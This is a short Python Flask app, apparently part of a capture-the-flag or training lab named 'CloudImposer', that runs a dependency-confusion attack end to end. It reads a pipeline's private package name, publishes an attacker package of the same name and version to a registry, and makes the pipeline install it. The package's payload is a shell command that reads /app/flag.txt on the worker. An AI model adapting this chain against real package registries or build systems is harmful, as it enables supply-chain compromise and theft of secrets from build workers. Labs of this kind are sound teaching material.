"""Dependency confusion: register the private name in the global namespace."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
REGISTRY = os.environ.get("REGISTRY_URL", "http://pkg-registry:5000")
PIPELINE = os.environ.get("PIPELINE_URL", "http://composer-pipeline:5000")

HTML = """<h1>CloudImposer — Dependency Confusion</h1>
<form method="post" action="/run"><button>Run chain</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    log = []
    docs = requests.get(f"{PIPELINE}/", timeout=8).json()
    req = docs["requirements"][0]
    log.append(f"[1] platform resolves private package {req['name']}=={req['version']}")
    evil = "echo 'malicious setup running on platform worker'; cat /app/flag.txt"
    r = requests.put(f"{REGISTRY}/packages/{req['name']}/{req['version']}",
                     data=evil, timeout=8)
    log.append(f"[2] attacker registered {req['name']}=={req['version']}: {r.json()}")
    res = requests.post(f"{PIPELINE}/resolve", json={"package": req["name"], "version": req["version"]}, timeout=15)
    log.append(f"[3] platform installed attacker package:\n{res.text}")
    return HTML.replace("{{out}}", "\n".join(log))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
